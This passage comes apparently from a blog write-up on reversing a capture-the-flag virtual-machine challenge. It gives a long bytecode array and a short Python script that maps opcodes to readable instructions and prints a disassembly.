<span class="number">0x00000007</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000D</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>,</span><br><span class="line">     <span class="number">0x0000000D</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000100</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x0000011C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000154</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0xE8D1D5DF</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000183</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000153</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0xF5E3C114</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000127</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000154</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x228EC216</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000183</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000153</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x89D45A61</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000132</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000154</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x655B8F69</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000183</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000153</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x2484A07A</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x0000013D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000154</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0xD9E5E7F8</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000183</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000153</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x3A441532</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000148</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000154</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x91AB7E88</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000183</span>, <span class="number">0x00000001</span>, <span class="number">0x00000014</span>, <span class="number">0x00000153</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x69FC64BC</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x007D3765</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000189</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000063</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x9E3779B9</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00095C4C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x0000871D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x0001A7B7</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x0012C7C7</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000011</span>, <span class="number">0x00000010</span>, <span class="number">0x00000001</span>, <span class="number">0x00000012</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000013</span>, <span class="number">0x00000160</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000011</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000012</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000011</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000012</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000014</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000014</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000079</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000065</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000073</span>, <span class="number">0x00000062</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000014</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(a))</span></span><br><span class="line"><span class="comment"># for i in range(0, len(a), 3):</span></span><br><span class="line"><span class="comment">#     print(a[i], a[i+1], a[i+2])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asmmm_map = &#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">&quot;nop&quot;</span>,</span><br><span class="line">    <span class="number">1</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] = &#123;1&#125;&quot;</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] = VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="comment"># 指定位置的数据传给指定的寄存器</span></span><br><span class="line">    <span class="number">3</span>: <span class="string">&quot;v3 = (VM-&gt;stack_top - &#123;1&#125;) VM-&gt;REG[&#123;0&#125;] = VM-&gt;stack[v3];&quot;</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="string">&quot;result = (VM-&gt;stack_top - &#123;0&#125;) VM-&gt;stack[result] = VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="string">&quot;push REG[&#123;0&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="string">&quot;pop REG[&#123;0&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] += VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] -= VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">9</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] /= VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] *= VM-&gt;REG[&#123;1&#125;];&quot;</span>,</span><br><span class="line">    <span class="number">11</span>: <span class="string">&quot;VM-&gt;REG[&#123;0&#125;] ^= VM-&gt;REG[&#123;1&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="string">&quot;VM-&gt;_eip = 3 * VM-&gt;REG[&#123;0&#125;]&quot;</span>,</span><br><span class="line">    <span class="number">13</span>: <span class="string">&quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125; if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;</span>,</span><br><span class="line">    <span class="number">14</span>: <span class="string">&quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;</span>,</span><br><span class="line">    <span class="number">15</span>: <span class="string">&quot;VM-&gt;REG[&#123;1&#125;] &lt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;</span>,</span><br><span class="line">    <span class="number">16</span>: <span class="string">&quot;VM-&gt;REG[&#123;1&#125;] &gt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;</span>,</span><br><span class="line">    <span class="number">97</span>: <span class="string">&quot;getchar&quot;</span>,</span><br><span class="line">    <span class="number">98</span>: <span class="string">&quot;putchar&quot;</span>,</span><br><span class="line">    <span class="number">99</span>: <span class="string">&quot;vm quit&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(asmmm_map[a[i]].<span class="built_in">format</span>(a[i+<span class="number">1</span>], a[i+<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 